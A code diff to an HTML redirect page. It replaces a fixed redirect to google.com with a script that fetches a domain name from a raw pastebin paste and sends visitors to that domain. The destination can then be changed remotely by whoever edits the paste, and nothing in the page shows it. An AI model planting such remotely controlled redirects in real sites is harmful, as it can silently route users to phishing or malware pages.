@@ -4,12 +4,19 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    window.onload = () => {
-      const base = "https://google.com";
-      const parts = location.pathname.split("/").filter(Boolean);
-      if (parts.length >= 2) parts.splice(0, 2);
-      const target = parts.length ? `${base}/${parts.join("/")}` : base;
-      location.replace(target);
+    window.onload = async () => {
+      try {
+        const response = await fetch('https://pastebin.com/raw/Mbned2Ye');
+        const text = await response.text();
+        const domain = text.trim();
+        const base = `https://${domain}.com`;
+        const parts = location.pathname.split("/").filter(Boolean);
+        if (parts.length >= 2) parts.splice(0, 2);
+        const target = parts.length ? `${base}/${parts.join("/")}` : base;
+        location.replace(target);
+      } catch (e) {
+        location.replace('https://google.com');
+      }
     };
   </script>
 </head>
